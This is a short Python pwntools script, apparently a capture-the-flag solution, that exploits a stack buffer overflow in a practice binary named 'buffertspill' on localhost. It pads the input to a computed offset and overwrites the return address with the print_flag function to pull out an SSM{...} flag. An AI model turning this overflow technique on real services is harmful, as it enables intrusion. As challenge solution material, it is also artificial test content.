#!/usr/bin/env python3

from pwn import *
import re

context(arch='amd64', os='linux')

HOST = 'localhost'
PORT = 31337

elf = ELF('./container/buffertspill')
#r = elf.process()
r = remote(HOST, PORT)
r.recvline_contains('Hur mycket vill du skriva?')

payload = b''
#payload += cyclic(0x200, n=8)
pad_len = cyclic_find('kaaaaaab', n=8)
payload += b'A'*pad_len
payload += p64(elf.symbols['print_flag'])

r.sendline(str(len(payload)))
#pause()
r.sendline(payload)
response = r.recv(0x1000)
flag = re.match(rb'SSM{.*}', response).group(0).decode('ascii')
log.info('Flag: %s', flag)
